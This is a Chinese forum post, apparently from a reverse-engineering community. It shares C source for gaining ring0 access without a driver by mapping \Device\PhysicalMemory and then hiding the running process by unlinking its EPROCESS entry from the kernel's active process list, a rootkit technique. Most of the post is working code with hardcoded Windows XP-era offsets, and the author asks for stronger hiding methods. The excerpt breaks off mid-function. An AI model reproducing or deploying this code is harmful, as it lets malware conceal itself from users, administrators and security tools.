
# 无驱动 ring0 下隐藏进程

> 原文：[`www.pediy.com/kssd/pediy10/68729.html`](https://www.pediy.com/kssd/pediy10/68729.html)

标的是原创，其实是把几位高手的代码组合到一块，先用无驱动进入 `ring0`，再在 `ring0` 下修改内核对象隐藏自身进程信息。由于懒惰，里面有好多都是硬编码。望高人指点，特别希望有高人指点一下，最厉害的隐藏进程方法。以下是代码

编译方法：`cl qwer.c`

```c
#include <Windows.h>
#include <winioctl.h>
#include <winsvc.h>
#include <stdlib.h>
#include <stdio.h>
#include <Aclapi.h>
#include <Ntsecapi.h>

#pragma comment (lib,"ntdll.lib")
#pragma comment (lib,"Kernel32.lib")
#pragma comment (lib,"Advapi32.lib")

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define OBJ_KERNEL_HANDLE           0x00000200
#define STATUS_NOT_IMPLEMENTED       0xC0000002
#define STATUS_ACCESS_DENIED         0xC0000022

//typedef unsigned long DWORD;

#define STATUS_SUCCESS               0X00000000
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

#define InitializeObjectAttributes(p,n,a,r,s){\
       (p)->Length=sizeof(OBJECT_ATTRIBUTES);\
       (p)->RootDirectory=r;\
       (p)->Attributes=a;\
       (p)->ObjectName=n;\
       (p)->SecurityDescriptor=s;\
       (p)->SecurityQualityOfService=NULL;\
       }

NTSYSAPI NTSTATUS NTAPI ZwUnmapViewOfSection(IN HANDLE ProcessHandle,IN PVOID BaseAddress);
NTSYSAPI NTSTATUS NTAPI ZwClose(IN HANDLE Handle);
NTSYSAPI VOID NTAPI RtlInitUnicodeString(PUNICODE_STRING DestinationString,PCWSTR SourceString);
NTSYSAPI NTSTATUS NTAPI NtVdmControl(IN ULONG ControlCode,IN PVOID ControlData);

typedef enum _SECTION_INHERIT
{
    ViewShare=1,
    ViewUnmap=2
}SECTION_INHERIT;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _SYSTEM_MODULE_INFORMATION
{
    ULONG Reserved[2];
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR ImageName[256];
}SYSTEM_MODULE_INFORMATION,*PSYSTEM_MODULE_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenSection(\
    OUT PHANDLE SectionHandle,\
    IN ACCESS_MASK DesiredAccess,\
    IN POBJECT_ATTRIBUTES ObjectAttributes\
    );

  BOOLEAN
(NTAPI *pfnPsGetVersion)(
    PULONG MajorVersion OPTIONAL,
    PULONG MinorVersion OPTIONAL,
    PULONG BuildNumber OPTIONAL,
    PUNICODE_STRING CSDVersion OPTIONAL
    );   

HANDLE
(NTAPI *pfnPsGetCurrentProcessId)(
    );

HANDLE
(NTAPI *pfnPsGetCurrentProcess)();

NTSYSAPI
NTSTATUS
NTAPI
ZwMapViewOfSection(
    IN HANDLE SectionHandle, 
    IN HANDLE ProcessHandle, 
    IN OUT PVOID *BaseAddress, 
    IN ULONG ZeroBits, 
    IN ULONG CommitSize, 
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL, 
    IN OUT PULONG ViewSize, 
    IN SECTION_INHERIT InheritDisposition, 
    IN ULONG AllocationType, 
    IN ULONG Protect
    );

NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySystemInformation(
    ULONG SystemInformationClass, 
    PVOID SystemInformation, 
    ULONG SystemInformationLength, 
    PULONG ReturnLength
    );

PVOID
(NTAPI *pfnMemcpy)(
    IN VOID UNALIGNED *Destination, 
    IN CONST VOID UNALIGNED *Source, 
    IN SIZE_T Length
    );

    NTSTATUS
(NTAPI *pfnNtVdmControl)(
    IN ULONG ControlCode, 
    IN PVOID ControlData
    );

    ULONG
(_cdecl *pfnDbgPrint)(
    IN PCHAR Format, 
    ...
    );

/*typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
*/

NTSTATUS Ring0Code(ULONG size,PULONG buffer)
{
   DWORD eproc=0x00000000;
   ULONG BuildNumber;
   DWORD PIDOffset,ListOffset;
   int start_PID=0; 
   PLIST_ENTRY plist_active_procs;
   PIDOffset=0x84;
   ListOffset=0x88;
 
  //  LIST_ENTRY plist_active_procs;
  // PLIST_ENTRY plist_active_procs;//=NULL;
   
   eproc=(DWORD)pfnPsGetCurrentProcess();
   
   plist_active_procs=(LIST_ENTRY*)(eproc+ListOffset);
   
   *((DWORD*)plist_active_procs->Blink)=(DWORD)plist_active_procs->Flink;
   
   *((DWORD*)plist_active_procs->Flink+1)=(DWORD)plist_active_procs->Blink;
   
   //start_PID=\*((DWORD*)(eproc+PIDOffset));
   //current_PID=start_PID;
 
  // pfnPsGetVersion(NULL,NULL,&BuildNumber,NULL);
   
   //PLIST_ENTRY ListHead,ListPtr;
 
/*  switch (BuildNumber)    // 各版本 OS 的 KPEB 结构不同
    {
        case 2195:  // Win2000
//            ListOffset = 0xa0;
            PIDOffset = 0x9c;
//            NameOffset = 0x1fc;
            break;
        
        case 2600:  // WinXP
  //          ListOffset = 0x88;
            PIDOffset = 0x84;
//            NameOffset = 0x174;
            break;
        
        case 3790:  // Win2003
//            ListOffset = 0x88;
            PIDOffset = 0x84;
//            NameOffset = 0x154;
            break;
        
        default:
            return STATUS_NOT_IMPLEMENTED;
    }*/
   
   pfnDbgPrint("PIDOffset is %d\n",PIDOffset);
   
   //pfnDbgPrint("Enter Ring0\nmyprocess is %d\n",eproc);
   
   //pfnDbgPrint("Enter Ring0\BuildNumber is %d\n",BuildNumber);
 
  // ListOffset=0x88;
   
   return STATUS_SUCCESS;
}

/*
HANDLE OpenPhysicalMemory()
{
   DWORD dwRet;
   NTSTATUS status;
   UNICODE_STRING name;
   OBJECT_ATTRIBUTES oa;
   EXPLICIT_ACCESS ea;
   PSECURITY_DESCRIPTOR pSD;
   PACL pDacl=NULL;
   PACL pNewDacl=NULL;
   HANDLE hSection=NULL;
   HANDLE hSectionRet=NULL;
   
   RtlInitUnicodeString(&name,L"\\Device\\PhysicalMemory");
   
   InitializeObjectAttributes(&oa,&name,OBJ_KERNEL_HANDLE,NULL,NULL);
   
   status=ZwOpenSection(&hSectionRet,SECTION_MAP_READ|SECTION_MAP_WRITE,&oa);
   
   if(NT_SUCCESS(status))
   {
        printf("错误\n");
        return NULL;
   }
   
   dwRet=0;
   
   return NULL;
}*/

PVOID MapPhysicalMemory(HANDLE hSection, // 物理内存的 Section 句柄
                       ULONG Offset,     // 映射起始偏移量，相对于物理内存的 0 地址
                       ULONG CommitSize // 映射范围
                       )
{
    NTSTATUS status;
    PVOID BaseAddress = NULL;
    LARGE_INTEGER PhysicalAddress = {Offset, 0};
    SIZE_T ViewSize = CommitSize;
    
    status = ZwMapViewOfSection(hSection, (HANDLE)-1, &BaseAddress, 0, 
        CommitSize, &PhysicalAddress, &ViewSize, ViewShare, 0, PAGE_READWRITE);
    
    if (!NT_SUCCESS(status))
    {
        printf("ZwMapViewOfSection Failed: %d\n", LsaNtStatusToWinError(status));
        return NULL;
    }
    
    return BaseAddress;
}

HANDLE OpenPhysicalMemory()
{
    DWORD dwRet;
    NTSTATUS status;
    UNICODE_STRING name;
    OBJECT_ATTRIBUTES oa;
    EXPLICIT_ACCESS ea;
    PSECURITY_DESCRIPTOR pSD;
    PACL pDacl = NULL;
    PACL pNewDacl = NULL;
    HANDLE hSection = NULL;
    HANDLE hSectionRet = NULL;
    
    RtlInitUnicodeString(&name, L"\\Device\\PhysicalMemory");
    
    InitializeObjectAttributes(&oa, &name, OBJ_KERNEL_HANDLE, NULL, NULL);
    
    // 以可读写 Section 权限打开 PhysicalMemory
    status = ZwOpenSection(&hSectionRet, SECTION_MAP_READ | SECTION_MAP_WRITE, &oa);
    
    if (NT_SUCCESS(status)) goto FreeAndExit; // 打开成功，直接返回
    
    if (status != STATUS_ACCESS_DENIED)
    {
        // 错误，但非权限不足，打开失败
        printf("ZwOpenSection[0] Failed: %d\n", LsaNtStatusToWinError(status));
        hSectionRet = NULL;
        goto FreeAndExit;
    }
    
    // 以可读写 ACL 权限打开 PhysicalMemory
```
